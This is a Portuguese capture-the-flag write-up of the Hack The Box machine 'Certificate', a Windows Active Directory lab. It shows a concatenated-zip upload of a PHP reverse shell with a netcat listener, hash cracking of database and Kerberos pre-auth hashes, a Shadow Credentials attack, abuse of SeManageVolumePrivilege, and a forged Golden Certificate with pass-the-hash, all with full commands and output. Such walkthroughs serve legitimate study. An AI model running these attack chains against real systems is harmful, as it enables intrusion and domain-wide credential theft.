---
title: Certificate HTB Write-up
created: 2025-06-13 15:36
tags:
  - hackthebox
  - ctf
  - activedirectory
  - fileupload
  - adcs
draft: false
---

# Acesso total com o Certificado Dourado

![A imagem mostra um certificado com um selo dourado. Abaixo vemos o nome da máquina: Certificate](images/certificate/Certificate.png)

## Introdução

Olá mundo! Sejam bem vindos à mais uma aventura na minha jornada no mundo da cibersegurança. Hoje vamos falar sobre `Certificate`, uma máquina classificada como de dificuldade difícil no [Hackthebox](https://www.hackthebox.com). 

Em `Certificate` nós temos um` Windows Active Directory` com um website. Esse website é vulnerável ao ataque `Concatenated Zip File Upload` e, após obter as credenciais da usuária `Sara.B`, conseguimos logar no servidor via `Winrm`. Um arquivo `pcap` é então encontrado na pasta de documentos, onde podemos extrair a hash `krb5pa` do usuário `Lion.SK` e quebrá-la com `John The Ripper`. Usando os privilégios `GenericAll` de `Sara.B`, também podemos obter a `hash NT` do usuário `Ryan.K` por meio de um ataque `Shadow Credentials`. Por fim, conseguimos acesso de administrador depois de explorar os privilégios `SeManageVolumePrivilege` do usuário `Ryan.K`, para ter acesso à Raiz Certificadora ou `Root CA` e forjar um certificado de autenticação falso em nome do usuário `Administrator`.

Dito isso, sem mais demora, vamos começar!

---

## Reconhecimento

### Nmap

O resultado do [[NMAP]] mostrou que se tratava de um ` Windows Active Directory`. 

```bash {3}
PORT STATE SERVICE REASON VERSION 
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-01 09:49:07Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49730/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Uma coisa interessante é que a porta 80 http estava aberta, revelando uma página web ativa. Adicionei os domínios `DC01.certificate.htb` e `certificate.htb` ao meu arquivo `/etc/hosts` e visitei a página.

### Web

![[certificate-0.png | Página inicial]]

A página se trata de uma plataforma de cursos online onde podemos fazer alguns cursos, enviar as resoluções de questionários e pegar nosso certificado. Para interagir com as funcionalidades do site, criei uma conta e fiz o login.

![[certificate-2.png | Página de login]]

Depois de escolher um curso e visitar sua respectiva página, há botões onde podemos enviar as respostas dos questionários por meio de arquivos de extensão `.doc`, `.xlsx` ou `.pdf` comprimidos em formato `zip`. 

![[certificate-3.png | Página do curso]]

Certamente tentei várias técnicas de bypass para subir uma shell `php`, mas tudo em vão. 

![[certificate-4.png | Página de erro]]

Foi então que passei a pesquisar mais a respeito de técnicas de `file upload` com arquivos `zip` onde poderia bypassar uma shell e encontrei a técnica chamada `Concatenated Zip`.

> [!info] Concatenated ZIP
> Foi descoberto que certos compressores como `7zip`, podiam abrir arquivos maliciosos enquanto mostrava ao usuário um arquivo comum. A técnica tem esse nome porque nela criamos dois arquivos `zip`: um arquivo` safe.zip` e outro `malicious.zip`. Depois concatenamos os dois arquivos com o comando `cat safe.zip malicious.zip > combined.zip` e geramos um novo arquivo chamado `combined.zip`. Ao descompactar o arquivo `combined.zip` com `7zip`, apenas o arquivo seguro dentro de `safe.zip` é mostrado, mas após a descompactação o arquivo malicioso também estará lá, tendo bypassado as restrições do sistema. Mais informações sobre esse tipo de exploração [aqui](https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/).

Usando essa técnica criei dois arquivos: Um arquivo `zip` com um `pdf` normal, e outro arquivo `zip` com um diretório chamado shell e minha shell `php` dentro. O diretório é necessário visto que, ao que parece, o arquivo malicioso não é ativado se estiver no diretório padrão do upload. Talvez ele seja apagado por algum script de checagem de arquivos.

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Hard/Certificate/shell]
└─$ zip pt1.zip Upgrade_Notice.pdf
  adding: Upgrade_Notice.pdf (deflated 24%)
  
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ zip -r shell.zip shell/
  adding: shell/ (stored 0%)
  adding: shell/rev.php (deflated 72%)

┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ cat pt1.zip shell.zip > comb.zip

┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
```

---
## Acesso Inicial

Depois de upar o arquivo combinado, fui até o caminho `certificate.htb/static/uploads/346f96e85d110b7cfb38fe3b00565313/shell/rev.php` e obtive minha conexão reversa com o servidor.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.185] from (UNKNOWN) [10.129.202.33] 51620
SOCKET: Shell has connected! PID: 3712
Microsoft Windows [Version 10.0.17763.6532]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\certificate.htb\static\uploads\346f96e85d110b7cfb38fe3b00565313\shell>whoami
certificate\xamppuser
```

Já dentro do servidor, verifiquei se haviam outros usuários. Isso me permitiria criar uma lista para fazer `Password Spray` se necessário.

```bash
C:\xampp\htdocs\certificate.htb\static\uploads\346f96e85d110b7cfb38fe3b00565313\shell>net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D
Aya.W                    Eva.F                    Guest
John.C                   Kai.X                    kara.m
karol.s                  krbtgt                   Lion.SK
Maya.K                   Nya.S                    Ryan.K
saad.m                   Sara.B                   xamppuser
The command completed successfully.
```

### Banco de dados

Haviam vários usuários nesse domínio, então talvez algum desses estivesse no banco de dados dos cursos online, como professores ou alunos. Verificando o arquivo db.php, encontrei as credenciais `certificate_webapp_user : cert!f!c@teDBPWD`. No entanto não consegui logar no `Mysql` com essas credenciais. Então procurei mais um pouco e encontrei o arquivo `passwords.txt`.

```bash title="passwords.txt" 
c:\xampp>type passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!) 
   
<SNIPED>
```

Com as novas credenciais consegui encontrar a hash da usuária `Sara.B`, que possui privilégios administrativos.

```bash {24}
c:\xampp\mysql\bin>mysql.exe -u root -e "SHOW DATABASES;" 
Database
certificate_webapp_db
information_schema
mysql
performance_schema
phpmyadmin
test

c:\xampp\mysql\bin>mysql.exe -u root -e "USE certificate_webapp_db;SHOW TABLES;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses

c:\xampp\mysql\bin>mysql.exe -u root -e "USE certificate_webapp_db;SELECT * FROM users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher       1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher       1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      preacher        fulltime        preacher        preacher@root.htb       $2y$04$ydvboYNWg/L/sxRo97.COuzNJEd4u5vTYFXvZW/IV/qVxRaG89S56    2025-06-03 18:09:26  student  1
```

Usando `John The Ripper`, consegui quebrar a hash facilmente e obter a senha `Blink182`.

```bash {8}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-sara.b
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)
1g 0:00:00:05 DONE (2025-06-03 15:17) 0.1893g/s 2318p/s 2318c/s 2318C/s addison1..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Arquivo pcap

Depois de logar como `Sara.B` com a ferramenta `Evil-Winrm`, logo encontrei dois arquivos interessantes na pasta` \Documents\WS-01`: Um arquivo chamado `Description.txt` e outro chamado `WS-01_PktMon.pcap`. O arquivo `Description.txt` dizia:

```plaintext title="Description.txt"
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes! 
```

Parecia que um problema com a pasta compartilhada `Reports` estava travando o `file explorer`, mas verificando as pastas compartilhadas com as credenciais de `Sara.B` na ferramenta `Netexec`, não havia nenhuma pasta compartilhada com esse nome. Então fiz o download do arquivo `WS-01_PktMon.pcap` para fazer uma investigação das requisições de rede salvas no arquivo.

![[certificate-5.png | Hash krb5pa encontrada]]

Usando a ferramenta `Wireshark` e filtrando pelo protocolo [[KERBEROS]], pude encontrar um hash `krb5pa`, ou **hash de pré-autenticação Kerberos**. É possível copiar o valor do hash e montar usando a página do Hashcat. Mas eu uso `John The Ripper`, então tive que extrair de outro jeito. Primeiro, usei a ferramenta `Tshark` para extrair somente os pacotes de informação referentes ao protocolo `Kerberos` e salvar em um arquivo `data.pdml`. Em seguida, usei a ferramenta `krb2john` para extrair a hash `krb5pa` desse arquivo.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ tshark -2 -r WS-01_PktMon.pcap -R "tcp.dstport==88 or udp.dstport==88" -T pdml >> data.pdml

┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ krb2john data.pdml
[-] Hash might be broken, etype != 23 and salt not found!
Lion.SK:$krb5pa$18$Lion.SK$CERTIFICATE$$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0

┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ vim hash-Lion.SK                     # Change $CERTIFICATE$ to $CERTIFICATE.HTB$ 
```

Depois disso, usei o `John The Ripper` para quebrar a hash e obter a senha `!QAZ2wsx`.

```bash {11}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-Lion.SK
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "krb5pa-sha1", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5pa-sha1, Kerberos 5 AS-REQ Pre-Auth etype 17/18 [PBKDF2-SHA1 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (Lion.SK)
1g 0:00:00:12 DONE (2025-06-03 19:42) 0.07968g/s 1121p/s 1121c/s 1121C/s goodman..doghouse
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### Shell como Lion.SK

Usando novamente a ferramenta `Evil-Winrm`, fiz o login como `Lion.SK` e peguei a flag de usuário.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ evil-winrm -i certificate.htb -u 'Lion.SK' -p '!QAZ2wsx'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> cd C:\Users\Lion.SK\desktop
*Evil-WinRM* PS C:\Users\Lion.SK\desktop> ls


    Directory: C:\Users\Lion.SK\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/3/2025  10:43 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Lion.SK\desktop> cat user.txt
12357f9562abcdb0c40e5593f91f7312
```

---

## Escalação de Privilégios

Usando a ferramenta `Bloodhound-Python` do `Netexec`, fiz a enumeração de objetos do AD. Então, usando meu script criado com chatGPT verifiquei as **ACLs** dos usuários. Com base nos resultados, verifiquei que a usuária `Sara.B` tinha privilégios demais. Na época do lançamento desta máquina, `Sara.B` pertencia ao grupos `HR` e `Account Operators`. Este último grupo tendo o privilégio `GenericAll`  sobre todos os outros usuários e grupos, exceto usuário e grupos Administrators.

Usando os privilégios de `Sara.B`, eu obtive a `hash NT` do usuário `Ryan.K` por meio de um ataque `Shadow Credentials`.

```bash {25}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ faketime "$(ntpdate -q DC01.certificate.htb | cut -d ' ' -f 1,2)" certipy-ad shadow auto -u sara.b@certificate.htb -p Blink182 -account Ryan.K
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFICATE.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'Ryan.K'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'cc773185-6021-0750-cc6d-cfdc4fb218e2'
[*] Adding Key Credential with device ID 'cc773185-6021-0750-cc6d-cfdc4fb218e2' to the Key Credentials for 'Ryan.K'
[*] Successfully added Key Credential with device ID 'cc773185-6021-0750-cc6d-cfdc4fb218e2' to the Key Credentials for 'Ryan.K'
[*] Authenticating as 'Ryan.K' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Restoring the old Key Credentials for 'Ryan.K'
[*] Successfully restored the old Key Credentials for 'Ryan.K'
[*] NT hash for 'Ryan.K': b1bc3d70e70f4f36b1509a65ae1a2ae6 
```

Usando a técnica `Pass-the-hash` com `Evil-Winrm`, consegui me logar como `Ryan.K`. Olhando os privilégios desse usuário, percebi que ele possuía o privilégio `SeManageVolumePrivilege`.

```bash {23}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ evil-winrm -i certificate.htb -u 'Ryan.K' -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6'

Evil-WinRM shell v3.7 

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> ls
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami
certificate\ryan.k
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
*Evil-WinRM* PS C:\Users\Ryan.K\Documents>
```

Pesquisando sobre `SeManageVolumePrivilege`, descobri que havia um [exploit público](https://github.com/CsEnox/SeManageVolumeExploit) que abusava desse privilégio. Ele dá a todos os usuários permissões sobre o inteiro disco `C:\`. Após executar o exploit, era só copiar uma **DLL** maliciosa chamada `Printconfig.dll` para `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`, para substituir o arquivo original. Por fim, era só iniciar o objeto `PrintNotify` e receber a shell reversa como `NT AUTHORITY SYSTEM`. 

O plano parecia perfeito, mas só parecia. Na realidade, toda tentativa de conexão reversa era bloqueada pelo `Windows Defender` e, a partir daí me lembrei que estava em uma máquina difícil e coisas como simplesmente subir uma shell e rodá-la estava fora de questão. No entanto, nem tudo estava perdido.

Por um momento me lembrei que o nome da máquina é **Certificate** e que até então, eu não havia explorado nenhuma falha referente a certificados. Então, usando o comando `certutil -Store My`, chequei se havia certificados pessoais usados pelo usuário `Ryan.K`. Felizmente, encontrei a **Raiz Certificadora** , ou `Root CA`, que poderia ser usada para gerar um certificado confiável, que poderia servir de base para forjar um certificado contendo a chave privada original em nome do `Administrator`.

```bash {46}
*Evil-WinRM* PS C:\users\administrator\desktop> c:/temp/SeManageVolumeExploit.exe
*Evil-WinRM* PS C:\users\administrator\desktop> certutil -Store My
My "Personal"
================ Certificate 0 ================ 
Archived!
Serial Number: 472cb6148184a9894f6d4d2587b1b165
Issuer: CN=certificate-DC01-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:30 PM
 NotAfter: 11/3/2029 3:40 PM
Subject: CN=certificate-DC01-CA, DC=certificate, DC=htb
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Cert Hash(sha1): 82ad1e0c20a332c8d6adac3e5ea243204b85d3a7
  Key Container = certificate-DC01-CA
  Unique container name: 6f761f351ca79dc7b0ee6f07b40ae906_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed

================ Certificate 1 ================
Serial Number: 5800000002ca70ea4e42f218a6000000000002
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 8:14 PM
 NotAfter: 11/3/2025 8:14 PM
Subject: CN=DC01.certificate.htb
Certificate Template Name (Certificate Type): DomainController
Non-root Certificate
Template: DomainController, Domain Controller
Cert Hash(sha1): 779a97b1d8e492b5bafebc02338845ffdff76ad2
  Key Container = 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Simple container name: te-DomainController-3ece1f1c-d299-4a4d-be95-efa688b7fee2
  Provider = Microsoft RSA SChannel Cryptographic Provider
Private key is NOT exportable
Encryption test passed

================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
CertUtil: -store command completed successfully.
```

Daí exportei esse certificado com sua chave privada para um arquivo `pfx` (Personal Information Exchange).

```bash
*Evil-WinRM* PS C:\users\administrator\desktop> certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca cert.pfx
My "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file cert.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

Depois de fazer o download do arquivo para minha máquina, usei a ferramenta `Certipy-ad` para forjar um certificado de autenticação em nome do usuário `Administrator`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ certipy-ad forge -ca-pfx cert.pfx -out golden.pfx -upn Administrator
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'golden.pfx'
[*] Wrote forged certificate and private key to 'golden.pfx'
```

Por fim, obtive a `hash NT` do `Administrator` com ataque `Golden Certificate`.

```bash {13}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ faketime "$(ntpdate -q DC01.certificate.htb | cut -d ' ' -f 1,2)" certipy-ad auth -pfx golden.pfx -dc-ip $IP -user Administrator -domain certificate.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator' 
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

Usando novamente a técnica `Pass-the-hash` com `Evil-Winrm`, consegui me logar como `Administrator` e obter a flag do root.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
└─$ evil-winrm -i certificate.htb -u 'administrator' -H 'd804304519bf0143c14cbf1c024408c6'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../desktop


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/7/2025   4:29 AM           2675 cert.pfx
-ar---         6/7/2025  12:28 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
674330e48ebaa48fcbf8acb7790a3659
```

---

## Conclusão

![[CertificateFinal.png | Mesma imagem do início porém abaixo está escrito: Certificate has been pwned]]

Essa máquina me mostrou que existe um abismo entre as máquinas médias e difíceis e que eu preciso estudar bastante coisa ainda. `Windows` certamente não é meu forte, mas depois da sequência de máquinas `Windows AD`, acho que estou começando a gostar de pentest nesse tipo de ambiente.

```mermaid
flowchart TD
	subgraph acesso inicial
    A(Website) -->|concatenated zip file upload| B(xamppuser) 
    B -->|mysql database| C(Sara.B)
    C -->|krb5pa hash no arquivo pcap| D(Lion.SK)
    D --> E[user.txt]
    end
    subgraph escalação de privilegios
    C -->|shadow credentials| F(Ryan.K)
    F -->|SeManageVolumeAbuse.exe| G[Privilégios Elevados]
    G -->|golden Certificate| H[root.txt]
    end
```